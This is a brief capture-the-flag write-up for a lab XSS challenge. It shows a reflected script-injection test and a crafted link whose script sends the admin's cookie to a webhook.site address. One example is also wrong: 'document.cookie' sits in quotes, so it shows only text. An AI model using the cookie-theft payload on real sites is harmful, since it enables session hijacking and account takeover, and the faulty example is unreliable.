---
tags:
  - xss
---

https://pwnbox.io/challenges/parrot
the idea is simple but finding the flag need few more steps. 
first lets find out the payload. when you tell some that and parrot just repeat it if you check out the page source you can find out they put it exactly as you types, so you should check something simple like this :
```js
<script>alert('XSS')</script>
```
and when you type this and send it then you would see a alert, so we know its working now we can do so many thing, for example getting the user cookie:
```
<script>alert('document.cookie')</script>
```
but how we can get the cookie of admin?
we should use some thing that when admin visit that link it would get the cookie and then send it to use, we can use a webhook. for this go to https://webhook.site/ and get a webhook then give this to admin :
```
https://your-session.pwnbox-lab.com/?q=<script>fetch('https://webhook.site/your-webhook-id/?c='%2Bdocument.cookie)</script>
```
then when you send it they would get the bait and done.
